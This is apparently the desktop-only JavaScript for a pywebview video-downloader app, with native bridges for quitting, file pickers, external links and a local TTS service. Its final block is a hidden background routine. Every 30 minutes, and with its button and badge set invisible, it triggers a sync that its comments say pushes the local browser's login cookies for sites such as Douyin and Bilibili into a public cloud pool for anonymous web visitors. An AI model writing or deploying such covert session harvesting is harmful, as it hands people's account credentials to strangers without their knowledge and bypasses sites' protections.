// web/js/desktop-app.js — 桌面版(pywebview)专属行为脚本。
//
// 仅由 index.html 在检测到 window.pywebview 存在时才加载；纯 web 环境永不加载本文件。
// 因此本文件里的所有 app 专属功能，都不会进入 web 的加载集，也不会影响 web 端。
//
// ⚠️ 这是 app 端窗口的专属编辑文件：以后桌面版的新功能（退出/原生桥接/系统托盘等）
//    只改这里，不要写回共享的 web/app.js，也不要让 web 窗口碰本文件。
//
// 复用 web/app.js 暴露的共享能力：window.VDL（el/$/escHtml/request/showError/
// createTaskCard/switchView）。app.js 必须先于本文件执行（index.html 已保证顺序）。
(function () {
  'use strict';

  if (!window.VDL || !window.VDL.el) {
    console.error('[desktop-app] window.VDL 未就绪，跳过桌面专属初始化');
    return;
  }
  const el = window.VDL.el;

  // 显式「退出」/「返回桌面」按钮：仅桌面版(pywebview)显示；浏览器回退模式隐藏（无原生窗口可退）
  (function initQuitButton() {
    const wire = () => {
      const api = window.pywebview && window.pywebview.api;
      if (api && typeof api.quit_app === 'function') {
        el.quitAppBtn.hidden = false;
        el.quitAppBtn.addEventListener('click', () => {
          if (window.confirm('确定退出 VideoDownloader？')) api.quit_app();
        });
      }
      if (api && typeof api.hide_to_desktop === 'function') {
        el.hideToDesktopBtn.hidden = false;
        el.hideToDesktopBtn.addEventListener('click', () => {
          api.hide_to_desktop();
        });
      }
    };
    if (window.pywebview && window.pywebview.api) {
      wire();
    } else {
      document.addEventListener('pywebviewready', wire, { once: true });
    }
  })();

  // 桌面增强命名空间：app.js 通过 window.VDL.desktop 委托纯桌面能力；
  // 纯 web 环境不加载本文件，故 window.VDL.desktop 为 undefined，app.js 自动走 web 回退。
  // 这是 Phase2「前端按端拆分」的增强层归宿——所有「无 web 等价」的桌面行为集中于此。
  const desktop = {
    // 在系统浏览器打开外部链接（OAuth 授权页等）。返回 true=已用原生桥接打开，
    // false=无原生桥接（调用方应回退到 window.open）。
    openExternal(url) {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.open_external === 'function')) return Promise.resolve(false);
      const norm = (r) => (typeof r === 'string') ? !r.startsWith('ERROR') : true;
      try {
        const r = api.open_external(url);
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => false);
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve(false); // 桥接异常：告知调用方回退
      }
    },
    // 弹出系统文件夹选择框，返回所选目录绝对路径；无桥接或用户取消返回空串。
    // 注意：pywebview 的 api.* 调用返回 Promise，必须 await/then 取值。
    chooseFolder() {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.choose_folder === 'function')) return Promise.resolve('');
      const norm = (r) => (typeof r === 'string') ? (r.startsWith('ERROR') ? '' : r) : (r || '');
      try {
        const r = api.choose_folder();
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => '');
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve('');
      }
    },
    // 弹出系统多文件选择框，返回绝对路径数组；无桥接或用户取消返回空数组。
    // 注意：pywebview 的 api.* 调用返回 Promise，必须 await/then 取值。
    chooseFiles() {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.choose_files === 'function')) { return Promise.resolve([]); }
      const norm = (r) => {
        if (!r) return [];
        if (typeof r === 'string') return r.startsWith('ERROR') ? [] : r.split('\n').filter(Boolean);
        if (Array.isArray(r)) return r.filter(Boolean);
        return [];
      };
      try {
        const r = api.choose_files();
        if (r && typeof r.then === 'function') {
          return r.then(norm).catch(() => []);
        }
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve([]);
      }
    },
    // 保存抠图结果：弹系统保存面板，用户自选透明 PNG 位置；取消返回 "CANCELLED"，
    // 失败返回 "ERROR: ..."。无桥接时返回空串让调用方走 <a download> 兜底。
    saveMattingFile(jobId, suggestedName) {
      const api = window.pywebview && window.pywebview.api;
      if (!(api && typeof api.save_matting_file_dialog === 'function')) return Promise.resolve('');
      const norm = (r) => (typeof r === 'string') ? r : (r || '');
      try {
        const r = api.save_matting_file_dialog(jobId, suggestedName || 'matting.png');
        if (r && typeof r.then === 'function') return r.then(norm).catch(() => '');
        return Promise.resolve(norm(r));
      } catch (e) {
        return Promise.resolve('');
      }
    },
    // 一键开启本地语音克隆（IndexTTS-MLX）：自动寻找并启动本地服务，返回 {ok, msg}。
    // 普通用户无需理解「端口/服务」等概念，点一下由 App 自己搞定；无桥接则回退提示。
    startIndexTts() {
      const api = window.pywebview && window.pywebview.api;
      if (api && typeof api.start_indextts_mlx === 'function') {
        try {
          return api.start_indextts_mlx();
        } catch (e) {
          return { ok: false, msg: '开启失败：' + e };
        }
      }
      return { ok: false, msg: '当前环境不支持自动开启，请在桌面版中使用。' };
    },
  };
  window.VDL.desktop = desktop;

  // 「Cookie 同步到云端」：仅 App 端，纯后台自动同步，按钮/徽标对用户不可见。
  // - 把本机浏览器各强反爬站(抖音/B站/快手/小红书等)的登录态自动推送到网页版(Railway)
  //   公共池，让网页版访客无需手动粘贴即可复用。
  // - 桌面版常驻时每 30 分钟自动刷新一次（启动后立即同步一次），使网页版共享登录态
  //   保持新鲜。完全后台执行，不打扰用户。
  (function initSyncCookie() {
    const btn = document.createElement('button');
    btn.id = 'syncCookieBtn';
    btn.textContent = '同步 Cookie 到云端';
    btn.type = 'button';
    // 不写内联样式 — 交给 .sidebar-cookie-sync button 类控制（padding/width/font 等）
    // 若未来 sidebar 兜底失效落到 header/body，那时需要 inject 完整样式，目前先不写
    btn.style.cssText = '';
    const badge = document.createElement('span');
    badge.id = 'syncCookieBadge';
    badge.textContent = '';
    badge.style.cssText = '';

    async function syncToCloud(showAlert) {
      // 后台静默同步：showAlert 仅在手动触发时为 true，目前按钮不可见不会传 true。
      const old = btn.textContent;
      btn.disabled = true;
      btn.textContent = '同步中…';
      try {
        const resp = await fetch('/api/cookie/sync/to-cloud', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({}),
        });
        const data = await resp.json().catch(() => ({}));
        if (resp.ok) {
          const t = new Date().toLocaleTimeString();
          badge.textContent = `云端登录态已同步 ${t}（${data.pushed}/${data.total} 站）`;
          if (showAlert) {
            const lines = (data.results || [])
              .map((r) => `· ${r.domain}: ${r.pushed ? '已推送' : '未推送' + (r.reason ? '(' + r.reason + ')' : '')}`)
              .join('\n');
            window.alert(`同步完成（${data.pushed}/${data.total} 站成功）\n\n${lines}`);
          }
        } else {
          badge.textContent = '云端同步未配置/失败';
          if (showAlert) window.alert('同步失败：' + (data.detail || '未知错误'));
        }
      } catch (e) {
        badge.textContent = '云端同步出错';
        if (showAlert) window.alert('同步出错：' + e.message);
      } finally {
        btn.disabled = false;
        btn.textContent = old;
      }
    }

    // 用户视角：按钮/徽标均不可见。wrap 创建后立即隐藏，避免在 sidebar 留下空白
    // （display:none 不占布局空间，连带 badge 一起消失）。
    // 即使完全隐藏 DOM，setInterval 依然按 30min 节奏在后端触发同步。
    const sidebar = document.querySelector('aside.sidebar') || document.querySelector('.sidebar');
    if (sidebar) {
      const wrap = document.createElement('div');
      wrap.id = 'syncCookieWrap';
      wrap.className = 'sidebar-cookie-sync';
      wrap.style.display = 'none';   // ← 用户要求：界面不可见
      wrap.appendChild(btn);
      wrap.appendChild(badge);
      sidebar.insertBefore(wrap, sidebar.firstElementChild);
    } else {
      // sidebar 还不存在时，兜底：对象保留在内存，IIFE 末尾的定时器仍会触发同步；
      // 元素不挂到可视 DOM，对用户依然不可见。
      // 不 append 到 header/body，避免污染布局。
      void btn; void badge;
    }

    // 桌面版就绪后自动同步一次，并每 30 分钟保活（用户要求：固定半个小时自动触发）。
    const wire = () => { syncToCloud(false); };
    if (window.pywebview && window.pywebview.api) {
      wire();
    } else {
      document.addEventListener('pywebviewready', wire, { once: true });
    }
    setInterval(() => syncToCloud(false), 30 * 60 * 1000);
  })();
})();
